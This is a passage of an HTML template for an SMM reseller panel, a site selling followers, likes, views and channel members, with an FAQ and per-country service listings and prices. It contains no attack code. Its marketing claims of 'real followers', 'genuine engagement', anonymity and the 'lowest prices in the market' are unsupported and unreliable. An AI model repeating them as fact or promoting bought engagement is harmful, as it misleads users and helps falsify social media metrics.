                                                                <div class="faq-block__header-title">
                                                                    <h4>Are {{ $settings['site_name'] ?? config('app.name') }} services safe to use?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-3">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>Yes, your security and privacy are our top
                                                                        priorities.</p>
                                                                    <p>We never ask for passwords, and all transactions
                                                                        are fully encrypted for maximum protection. It
                                                                        uses verified payment gateways and secure server
                                                                        systems to ensure your data stays safe at all
                                                                        times.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-4"
                                                                aria-expanded="false" aria-controls="#faq-block-97-4">
                                                                <div class="faq-block__header-title">
                                                                    <h4>Do you provide real followers and engagement?
                                                                    </h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-4">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>Yes!</p>
                                                                    <p>Our services are built to deliver realistic,
                                                                        high-quality results that look natural on your
                                                                        social profiles. Depending on the package you
                                                                        choose, you can opt for organic-style growth or
                                                                        fast-boost options — both reliable and
                                                                        effective.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-5"
                                                                aria-expanded="false" aria-controls="#faq-block-97-5">
                                                                <div class="faq-block__header-title">
                                                                    <h4>Can I use {{ $settings['site_name'] ?? config('app.name') }} as a reseller SMM panel?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-5">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>Absolutely! It is built as a full smm panel for
                                                                        resellers. As a main SMM provider, we offer
                                                                        complete API integration so you can connect our
                                                                        services to your own panel, automate orders, and
                                                                        build a profitable SMM business with ease.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-6"
                                                                aria-expanded="false" aria-controls="#faq-block-97-6">
                                                                <div class="faq-block__header-title">
                                                                    <h4>What payment methods do you accept?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-6">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p><strong>Our panel supports a wide range of global
                                                                            and crypto payment options, including
                                                                            credit/debit cards, PayPal, USDT, Bitcoin,
                                                                            and more.
                                                                            All payments are processed securely right
                                                                            from your dashboard — fast, easy, and fully
                                                                            protected.</strong></p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-7"
                                                                aria-expanded="false" aria-controls="#faq-block-97-7">
                                                                <div class="faq-block__header-title">
                                                                    <h4>How fast will my order start?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-7">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>Most orders begin almost instantly usually within
                                                                        seconds after your payment is confirmed.</p>
                                                                    <p>Delivery times vary depending on the service, but
                                                                        you can monitor every order in real time through
                                                                        your dashboard whenever you need.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-8"
                                                                aria-expanded="false" aria-controls="#faq-block-97-8">
                                                                <div class="faq-block__header-title">
                                                                    <h4>Is my identity anonymous when using {{ $settings['site_name'] ?? config('app.name') }}?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-8">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>Yes — we fully respect your privacy.</p>
                                                                    <p>You can use our panel without providing any
                                                                        personal or sensitive information, and all your
                                                                        transactions remain completely confidential and
                                                                        anonymous.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-9"
                                                                aria-expanded="false" aria-controls="#faq-block-97-9">
                                                                <div class="faq-block__header-title">
                                                                    <h4>Do you have customer support?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-9">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>Of course!</p>
                                                                    <p>Our 24/7 support team is always here to help with
                                                                        payments, orders, or API setup.</p>
                                                                    <p>Whether you’re a beginner or a reseller, we’re
                                                                        ready to assist you every step of the way.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-10"
                                                                aria-expanded="false" aria-controls="#faq-block-97-10">
                                                                <div class="faq-block__header-title">
                                                                    <h4>Is {{ $settings['site_name'] ?? config('app.name') }} the cheapest SMM panel available?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-10">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>Yes, we offer the lowest prices in the market,
                                                                        with services starting from $0.001/1K. Whether
                                                                        you're looking for a platform for personal use
                                                                        or a cheapest SMM reseller panel for your
                                                                        agency, we deliver maximum value at minimum
                                                                        cost.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-11"
                                                                aria-expanded="false" aria-controls="#faq-block-97-11">
                                                                <div class="faq-block__header-title">
                                                                    <h4>Which social media platforms do you support?
                                                                    </h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: inherit;"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-11">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>We support all major platforms including
                                                                        Instagram, TikTok, YouTube, Facebook, Twitter/X,
                                                                        Telegram, and many more — with 5,000+ services
                                                                        available across every platform.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_129">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="header-with-text ">
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__title">
                                        <h2 class="text-center"><span style="font-size: 34px">Global SMM Panel Services
                                                – Country-Based Social Media Growth</span></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__description">
                                        <p class="text-center">No matter where you are — the USA, Europe, Asia, or South
                                            America {{ $settings['site_name'] ?? config('app.name') }} delivers reliable and affordable services tailored to your
                                            audience. Enjoy localized growth with global impact. Real, fast, and
                                            affordable built for every market.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_128">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="block-features ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 30px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed">
                                    <div class="col-ed md:col-ed-span-6 card overflow-hidden"
                                        style="padding: 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ">
                                        <div class="col-ed-elements h-100">
                                            <div class="col-ed-elements--element h-100">
                                                <div class="w-100 h-100">
                                                    <div class="block-features__wrapper">
                                                        <div class="features-card__preview">
                                                            <div class="block-features__card-img"
                                                                style="background-image: url(https://storage.perfectcdn.com/hx1lyd/qrmas38r35sn9o92.png);">
                                                            </div>
                                                        </div>
                                                        <div class="card features-card"
                                                            style="
                                                                                                                                                                                                                                                                                                                     padding-left: 16px;                                                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="block-features__card">
                                                                <div class="block-features__card-content">
                                                                    <div class="card-content__head style-text-features-title"
                                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                                        <p><span style="font-size: 22px"><strong
                                                                                    style="font-weight: bold">SMM Panel
                                                                                    India</strong></span></p>
                                                                    </div>
                                                                    <div class="card-content__desc">
                                                                        <div class="card-content__desc-text style-text-features-desc"
                                                                            style="padding-left: 0px; padding-right: 0px;">
                                                                            <p>Looking for a <strong>reliable SMM panel
                                                                                    in India</strong>? We deliver real
                                                                                followers, likes, and views at the most
                                                                                affordable prices — built for
                                                                                influencers, resellers, and agencies
                                                                                across the country. Fast delivery,
                                                                                secure payments in Rupees, and results
                                                                                you can actually see. Whether you're
                                                                                just starting out or scaling up, we make
                                                                                social media growth simple and
                                                                                affordable with the cheapest Indian SMM
                                                                                panel.</p>
                                                                            <p><br></p>
                                                                            <p><em><strong>Indian Recommended
                                                                                    </strong></em><strong>Services</strong>
                                                                            </p>
                                                                            <p><br></p>
                                                                            <p><em><strong>301 | Instagram 🇮🇳
                                                                                        Lik</strong></em><strong>es |
                                                                                    $1.</strong>25</p>
                                                                            <p><em><strong>4406| Instagram 🇮🇳 Random
                                                                                        Comments</strong></em><strong> |
                                                                                    $0.46</strong>45</p>
                                                                            <p><em><strong>3867| Telegram 🇮🇳
                                                                                        Membe</strong></em><strong>rs |
                                                                                    $0.</strong>21</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 card overflow-hidden"
                                        style="padding: 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ">
                                        <div class="col-ed-elements h-100">
                                            <div class="col-ed-elements--element h-100">
                                                <div class="w-100 h-100">
                                                    <div class="block-features__wrapper">
                                                        <div class="features-card__preview">
                                                            <div class="block-features__card-img"
                                                                style="background-image: url(https://storage.perfectcdn.com/hx1lyd/wbcnqfas5nxpo2ka.png);">
                                                            </div>
                                                        </div>
                                                        <div class="card features-card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="block-features__card">
                                                                <div class="block-features__card-content">
                                                                    <div class="card-content__head style-text-features-title"
                                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                                        <p><span style="font-size: 22px"><strong
                                                                                    style="font-weight: bold">Pakistan
                                                                                    SMM Panel</strong></span></p>
                                                                    </div>
                                                                    <div class="card-content__desc">
                                                                        <div class="card-content__desc-text style-text-features-desc"
                                                                            style="padding-left: 0px; padding-right: 0px;">
                                                                            <p>Your go-to Pakistan SMM panel for real
                                                                                followers, likes, and views at
                                                                                unbeatable prices. Whether you need an
                                                                                affordable bulk order system or the
                                                                                <strong>cheapest SMM panel in
                                                                                    Pakistan</strong>, we've got you
                                                                                covered. Fast delivery, secure payments
                                                                                — including Easypaisa — and 24/7 support
                                                                                make us the top choice for Pakistani
                                                                                marketers, influencers, and resellers.
                                                                            </p>
                                                                            <p><br></p>
                                                                            <p><em><strong>Pakistan Recommended
                                                                                    </strong></em><strong>Services</strong>
                                                                            </p>
                                                                            <p><br></p>
                                                                            <p><em><strong>2878 | Instagram 🇵🇰
                                                                                        Rep</strong></em><strong>ost |
                                                                                    $5</strong>.4</p>
                                                                            <p><em><strong>2289 | Instagram 🇵🇰 Channel
                                                                                        Memb</strong></em><strong>ers |
                                                                                    $0</strong>.5</p>
                                                                            <p><em><strong>4997 | Tiktok 🇵🇰
                                                                                        Lik</strong></em><strong>es |
                                                                                    $0.</strong>25</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 card overflow-hidden"
                                        style="padding: 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ">
                                        <div class="col-ed-elements h-100">
                                            <div class="col-ed-elements--element h-100">
                                                <div class="w-100 h-100">
                                                    <div class="block-features__wrapper">
                                                        <div class="features-card__preview">
                                                            <div class="block-features__card-img"
                                                                style="background-image: url(https://storage.perfectcdn.com/hx1lyd/day61xk5xcmrqx79.png);">
                                                            </div>
                                                        </div>
                                                        <div class="card features-card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="block-features__card">
                                                                <div class="block-features__card-content">
                                                                    <div class="card-content__head style-text-features-title"
                                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                                        <p><span style="font-size: 22px"><strong
                                                                                    style="font-weight: bold">SMM Panel
                                                                                    USA</strong></span></p>
                                                                    </div>
                                                                    <div class="card-content__desc">
                                                                        <div class="card-content__desc-text style-text-features-desc"
                                                                            style="padding-left: 0px; padding-right: 0px;">
                                                                            <p>American social media market is one of
                                                                                the most competitive in the world — and
                                                                                falling behind isn't an option. From
                                                                                TikTok creators going viral overnight to
                                                                                agencies running campaigns for major
                                                                                brands, everyone needs an edge. Our
                                                                                <strong>USA SMM panel</strong> gives you
                                                                                that edge — real engagement,
                                                                                lightning-fast delivery, and pricing
                                                                                that makes sense whether you're a solo
                                                                                creator or scaling an entire agency.</p>
                                                                            <p><br></p>
                                                                            <p><em><strong>USA Recommended
                                                                                    </strong></em><strong>Services</strong>
                                                                            </p>
                                                                            <p><br></p>
                                                                            <p><em><strong>3163 | Instagram 🇺🇸
                                                                                        Follow</strong></em><strong>ers
                                                                                    | $2</strong>.6</p>
                                                                            <p><em><strong>4554 | Instagram 🇺🇸
                                                                                        Li</strong></em><strong>kes |
                                                                                    $1</strong>.2</p>
                                                                            <p><em><strong>1991 | Tiktok 🇺🇸
                                                                                        Followe</strong></em><strong>rs
                                                                                    | $2</strong>.7</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 card overflow-hidden"
                                        style="padding: 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ">
                                        <div class="col-ed-elements h-100">
                                            <div class="col-ed-elements--element h-100">
                                                <div class="w-100 h-100">
                                                    <div class="block-features__wrapper">
                                                        <div class="features-card__preview">
                                                            <div class="block-features__card-img"
                                                                style="background-image: url(https://storage.perfectcdn.com/hx1lyd/kj4fyy75sw2l5cno.png);">
                                                            </div>
                                                        </div>
                                                        <div class="card features-card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="block-features__card">
                                                                <div class="block-features__card-content">
                                                                    <div class="card-content__head style-text-features-title"
                                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                                        <p><span style="font-size: 22px"><strong
                                                                                    style="font-weight: bold">SMM Panel
                                                                                    Indonesia</strong></span></p>
                                                                    </div>
                                                                    <div class="card-content__desc">
                                                                        <div class="card-content__desc-text style-text-features-desc"
                                                                            style="padding-left: 0px; padding-right: 0px;">
                                                                            <p>Looking for a trusted <strong>Indonesian
                                                                                    SMM panel</strong>? We deliver real
                                                                                followers, likes, and views to help you
                                                                                stand out across every major platform.
                                                                                Whether you're a content creator in
                                                                                Jakarta or an agency managing multiple
                                                                                clients across the archipelago, we've
                                                                                got everything you need to grow fast.
                                                                                Affordable pricing, secure payments, and
                                                                                reliable delivery make us the top choice
                                                                                for Indonesian creators, resellers, and
                                                                                businesses.</p>
                                                                            <p><br></p>
                                                                            <p><em><strong>Indonesia Recommended
                                                                                    </strong></em><strong>Services</strong>
                                                                            </p>
                                                                            <p><br></p>
                                                                            <p><em><strong>3921 | YouTube 🇮🇩
                                                                                        Vi</strong></em><strong>ews |
                                                                                    $2</strong>.9</p>
                                                                            <p><em><strong>5188 | Telegram 🇮🇩
                                                                                        Memb</strong></em><strong>ers |
                                                                                    $3</strong>.5</p>
                                                                            <p><em><strong>3895 | Telegram 🇮🇩 Bot
                                                                                        sta</strong></em><strong>rt |
                                                                                    $0.</strong>23</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 card overflow-hidden"
                                        style="padding: 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ">
                                        <div class="col-ed-elements h-100">
                                            <div class="col-ed-elements--element h-100">
                                                <div class="w-100 h-100">
                                                    <div class="block-features__wrapper">
                                                        <div class="features-card__preview">
                                                            <div class="block-features__card-img"
                                                                style="background-image: url(https://storage.perfectcdn.com/hx1lyd/2wl1ehwj1hnlentw.png);">
                                                            </div>
                                                        </div>
                                                        <div class="card features-card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="block-features__card">
                                                                <div class="block-features__card-content">
                                                                    <div class="card-content__head style-text-features-title"
                                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                                        <p><span style="font-size: 22px"><strong
                                                                                    style="font-weight: bold">SMM Panel
                                                                                    Nigeria</strong></span></p>
                                                                    </div>
                                                                    <div class="card-content__desc">
                                                                        <div class="card-content__desc-text style-text-features-desc"
                                                                            style="padding-left: 0px; padding-right: 0px;">
                                                                            <p>Nigeria's digital scene is exploding —
                                                                                from Afrobeats artists building global
                                                                                fanbases to entrepreneurs turning
                                                                                Instagram pages into full businesses.
                                                                                Social media isn't just entertainment
                                                                                here, it's a serious hustle. But growing
                                                                                organically in such a crowded space
                                                                                takes time nobody has. That's where we
                                                                                come in. Our <strong>SMM panel in
                                                                                    Nigeria</strong> gives you the
                                                                                momentum you need — real followers,
                                                                                genuine engagement, and fast delivery at
                                                                                prices that work for the Naira.</p>
                                                                            <p><br></p>
                                                                            <p><em><strong>Nigerian Recommended
                                                                                    </strong></em><strong>Services</strong>
                                                                            </p>
                                                                            <p><br></p>
                                                                            <p><em><strong>2716 | Instagram 🇳🇬
                                                                                        Follow</strong></em><strong>ers
                                                                                    | $4</strong>.7</p>
                                                                            <p><em><strong>2737 | Threads 🇳🇬
                                                                                        Follow</strong></em><strong>ers
                                                                                    | $7</strong>.8</p>
                                                                            <p><em><strong>2748 | Tiktok 🇳🇬
                                                                                        Followe</strong></em><strong>rs
                                                                                    | $7</strong>.8</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 card overflow-hidden"
                                        style="padding: 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ">
                                        <div class="col-ed-elements h-100">
                                            <div class="col-ed-elements--element h-100">
                                                <div class="w-100 h-100">
                                                    <div class="block-features__wrapper">
                                                        <div class="features-card__preview">
                                                            <div class="block-features__card-img"
                                                                style="background-image: url(https://storage.perfectcdn.com/hx1lyd/eq8pc2pwcybu6ydx.png);">
                                                            </div>
                                                        </div>
                                                        <div class="card features-card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="block-features__card">
                                                                <div class="block-features__card-content">
                                                                    <div class="card-content__head style-text-features-title"
                                                                        style="margin-bottom: 9px; padding-left: 0px; padding-right: 0px;">
                                                                        <p><span style="font-size: 22px"><strong
                                                                                    style="font-weight: bold">SMM Panel
                                                                                    UK</strong></span></p>
                                                                    </div>
                                                                    <div class="card-content__desc">
                                                                        <div class="card-content__desc-text style-text-features-desc"
                                                                            style="padding-left: 0px; padding-right: 0px;">
                                                                            <p>The UK social media landscape is
                                                                                sophisticated, fast-moving, and brutally
                                                                                competitive. British audiences are savvy
                                                                                — they can spot inauthentic content a
                                                                                mile away, and they expect the best.
                                                                                Whether you're a London-based agency
                                                                                managing high-profile clients or an
                                                                                independent creator trying to break
                                                                                through, our <strong>UK SMM
                                                                                    panel</strong> delivers the real
                                                                                engagement and credibility you need to
                                                                                be taken seriously. No shortcuts, no
                                                                                fluff — just results that hold up.</p>
                                                                            <p><br></p>
                                                                            <p><em><strong>UK Recommended
                                                                                    </strong></em><strong>Services</strong>
                                                                            </p>
                                                                            <p><br></p>
                                                                            <p><em><strong>2486 | YouTube 🇬🇧
                                                                                        Lik</strong></em><strong>es |
                                                                                    $0.</strong>36</p>
                                                                            <p><em><strong>1157 | Telegram 🇬🇧
                                                                                        Memb</strong></em><strong>ers |
                                                                                    $0</strong>.9</p>
                                                                            <p><em><strong>3167 | Instagram 🇬🇧
                                                                                        Followe</strong></em><strong>rs
                                                                                    | $2</strong>.6</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 card overflow-hidden"
                                        style="padding: 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ">
                                        <div class="col-ed-elements h-100">
                                            <div class="col-ed-elements--element h-100">
                                                <div class="w-100 h-100">
                                                    <div class="block-features__wrapper">
                                                        <div class="features-card__preview">
                                                            <div class="block-features__card-img"
                                                                style="background-image: url(https://storage.perfectcdn.com/hx1lyd/i2aqn2ehzifcldhc.png);">
                                                            </div>
                                                        </div>
                                                        <div class="card features-card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="block-features__card">
                                                                <div class="block-features__card-content">
                                                                    <div class="card-content__head style-text-features-title"
                                                                        style="margin-bottom: 9px; padding-left: 0px; padding-right: 0px;">
                                                                        <p><span style="font-size: 22px"><strong
                                                                                    style="font-weight: bold">SMM Panel
                                                                                    Bangladesh</strong></span></p>
                                                                    </div>
                                                                    <div class="card-content__desc">
                                                                        <div class="card-content__desc-text style-text-features-desc"
                                                                            style="padding-left: 0px; padding-right: 0px;">
                                                                            <p>Bangladesh has one of the fastest-growing
                                                                                social media communities in Asia — and
                                                                                the competition for attention is fiercer
                                                                                than ever. Our BD SMM panel is trusted
                                                                                by thousands of local creators,
                                                                                resellers, and businesses who want real
                                                                                results without breaking the bank.
                                                                                Secure payments, instant orders, and
                                                                                genuine engagement — everything you need
                                                                                to dominate your niche. And when it
                                                                                comes to reliability and value, {{ $settings['site_name'] ?? config('app.name') }}
                                                                                is simply the <strong>best SMM panel in
                                                                                    Bangladesh</strong>.</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 card overflow-hidden"
                                        style="padding: 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ">
                                        <div class="col-ed-elements h-100">
                                            <div class="col-ed-elements--element h-100">
                                                <div class="w-100 h-100">
                                                    <div class="block-features__wrapper">
                                                        <div class="features-card__preview">
                                                            <div class="block-features__card-img"
                                                                style="background-image: url(https://storage.perfectcdn.com/hx1lyd/4umqqppdj84y8jxb.png);">
                                                            </div>
                                                        </div>
                                                        <div class="card features-card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="block-features__card">
                                                                <div class="block-features__card-content">
                                                                    <div class="card-content__head style-text-features-title"
                                                                        style="margin-bottom: 9px; padding-left: 0px; padding-right: 0px;">
                                                                        <p><span style="font-size: 22px"><strong
                                                                                    style="font-weight: bold">Arabic SMM
                                                                                    Panel</strong></span></p>
                                                                    </div>
                                                                    <div class="card-content__desc">
                                                                        <div class="card-content__desc-text style-text-features-desc"
                                                                            style="padding-left: 0px; padding-right: 0px;">
                                                                            <p>From the bustling streets of Dubai to the
                                                                                vibrant creative scene in Cairo, the
                                                                                Arabic-speaking world is one of the most
                                                                                engaged social media markets on the
                                                                                planet. Building a strong presence
                                                                                across the Middle East and North Africa
                                                                                takes more than just good content — it
                                                                                takes momentum. Our <strong>Arabic SMM
                                                                                    panel</strong> is designed
                                                                                specifically for Arabic audiences, with
                                                                                regional targeting, culturally relevant
                                                                                engagement, and instant delivery. Your
                                                                                brand deserves to be heard from Riyadh
                                                                                to Casablanca.</p>
                                                                            <p><br></p>
                                                                            <p><em><strong>Arabic Recommended
                                                                                    </strong></em><strong>Services</strong>
                                                                            </p>
                                                                            <p><br></p>
                                                                            <p><em><strong>4521 | Instagram 🇸🇦
                                                                                        Followe</strong></em><strong>rs
                                                                                    | $11</strong>.7</p>
                                                                            <p><em><strong>4524 | Instagram 🇸🇦
                                                                                        Lik</strong></em><strong>es |
                                                                                    $1.</strong>18</p>
                                                                            <p><em><strong>5004 | Tiktok 🇸🇦
                                                                                        Li</strong></em><strong>kes |
                                                                                    $0</strong>.3</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_130">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="text-block-with-image ">
                            <div class="row">
                                <div class="col">
                                    <div class="d-md-flex align-items-start">
                                        <div class="text-block__image">
                                            <img src="https://storage.perfectcdn.com/hx1lyd/joymoel7h8k9m39z.png" alt=""
                                                title="" class="img-fluid">
                                        </div>
                                        <div class="text-block__description">
                                            <h2><span style="font-size: 20px">Empowering Global Growth with {{ $settings['site_name'] ?? config('app.name') }} – The
                                                    Best SMM Panel for Everyone</span></h2>
                                            <p><span style="font-size: 16px">In today's fast-paced digital world,
                                                    standing out on social media is essential. {{ $settings['site_name'] ?? config('app.name') }} was built to make
                                                    professional social media growth accessible to everyone, no matter
                                                    where they are. Whether you're an influencer, a small business, or a
                                                    global agency, we give you the tools to achieve real engagement and
                                                    meaningful visibility — combining speed, safety, and
                                                    affordability.</span></p>
                                            <p><br></p>
